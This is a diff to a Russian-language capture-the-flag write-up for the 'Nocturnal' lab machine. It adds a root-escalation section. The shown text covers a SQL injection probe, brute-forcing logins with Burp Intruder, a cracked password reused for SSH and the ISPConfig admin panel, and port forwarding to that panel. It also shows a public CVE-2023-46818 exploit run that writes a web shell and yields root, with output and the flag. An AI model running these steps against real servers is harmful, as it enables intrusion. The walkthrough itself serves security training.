@@ -63,7 +63,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Очевидно, это файлообменник с функционалом логина и регистрации. Формочка логина не реагирует на простейшие вызовы sql инъекции (`' or 1 = 1; #` в пароль). Загрузить на сайт можно только файлы с безобидными расширениями: docx, pdf и подобные.
 
 ![меню личного кабинета](/img/user/image-1.png)
-
+  
 
 При наведении на ссылки на файлы мы видим, что у него очень примечательный способ найти, что скачивать.
 
@@ -73,9 +73,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 К сожалению, провернуть подобный трюк с пользователями не получится. Придётся перебирать список наиболее популярных логинов при помощи intruder из burp suite - брутфорсер параметров запросов.
 
-  
 
 ![intruder menu](/img/user/image-2.png)
+  
 
 Используя первый найденный лист наиболее популярных логинов и перебрав дозволенные расширения, мы можем найти интересный файл для пользователя amanda - privacy.odt.
 
@@ -244,6 +244,7 @@ COMMIT;
 
 ![радужная таблица на тобиаса](/img/user/image-6.png)
 
+
 Тогда у пользователя tobias пароль slowmotionapocalypse. Попробуем подключиться через ssh, найденный в самом начале через nmap.
 
 ```shell
@@ -336,3 +337,101 @@ tobias@nocturnal:~$
 ```
 
 Флаг найден.
+
+# ROOT
+
+К сожалению запустить linpeas на машине не удалось - у неё отсутствует доступ к интернету И возможность получить файл через curl в локальной сети.
+
+На сервере работает apache, рут которого обычно лежит в `/var/www/`, но там ничего интересного кроме странной ссылки:
+
+```shell
+
+tobias@nocturnal:/var/www$ ls -al
+
+total 24
+
+drwxr-xr-x  6 ispconfig ispconfig 4096 Apr 14 09:26 .
+
+drwxr-xr-x 14 root      root      4096 Oct 18  2024 ..
+
+drwxr-xr-x  2 root      root      4096 Mar  4 15:02 html
+
+lrwxrwxrwx  1 root      root        34 Oct 17  2024 ispconfig -> /usr/local/ispconfig/interface/web
+
+drwxr-xr-x  2 www-data  www-data  4096 Jun  8 15:36 nocturnal_database
+
+drwxr-xr-x  4 www-data  www-data  4096 Apr 17 09:02 nocturnal.htb
+
+drwxr-xr-x  4 ispconfig ispconfig 4096 Oct 17  2024 php-fcgi-scripts
+
+```
+
+ISPConfig это панель управления сервером для линукса. Звучит как серьёзная цель, к которой стоит подобраться. Наверняка он уже где-то запущен, проверим занятость портов:
+
+```shell
+
+tobias@nocturnal:/var/www$ netstat -tunl
+
+Active Internet connections (only servers)
+
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
+
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
+
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN
+
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN
+
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
+
+tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN
+
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN
+
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
+
+tcp6       0      0 :::22                   :::*                    LISTEN
+
+udp        0      0 127.0.0.53:53           0.0.0.0:*
+
+```
+
+Видно, что портов открыто больше чем нашёл nmap, следовательно, доступ туда возможен только из localhost. Для того чтобы это эксплуатировать, используем проброс портов, и заходим на веб страницу с формочкой логина.
+
+Используя логин `admin` и пароль пользователя `tobias`, можно войти внутрь и узнать, что версия ISPConfig - `3.2.2`, и на неё существуют уязвимости, в частности https://nvd.nist.gov/vuln/detail/CVE-2023-46818 , на которую уже существует скрипт: https://github.com/ajdumanhug/CVE-2023-46818 . Используем его и получим доступ к рут шеллу, который может прочитать рут флаг
+
+```shell
+
+$ python3 CVE-2023-46818.py http://localhost:8000 admin slowmotionapocalypse
+
+[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
+
+[+] Login successful!
+
+[+] Fetching CSRF tokens...
+
+[+] CSRF ID: language_edit_c6ad8c7d67d42f365b1fde1a
+
+[+] CSRF Key: 69a2aecd482eb59e6e3b0a62fe49c8ee9d9003a9
+
+[+] Injecting shell payload...
+
+[+] Shell written to: http://localhost:8000/admin/sh.php
+
+[+] Launching shell...
+
+  
+
+ispconfig-shell# id
+
+uid=0(root) gid=0(root) groups=0(root)
+
+  
+
+ispconfig-shell# cat /root/root.txt
+
+675fe34c8251ae589dce5113bba579d5
+
+```
